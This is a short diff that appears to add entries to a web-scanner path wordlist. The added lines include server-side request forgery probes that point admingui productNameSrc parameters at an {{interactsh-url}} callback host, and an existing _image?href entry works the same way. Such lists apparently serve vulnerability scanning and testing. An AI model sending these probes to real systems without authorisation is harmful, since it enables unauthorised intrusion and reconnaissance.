@@ -2029,3 +2029,6 @@
 /user/login
 /upload/
 /_image?href=//{{interactsh-url}}/600x400
+/rest/users/1
+/admingui/version/Version?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
+/admingui/version/Masthead.jsp?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
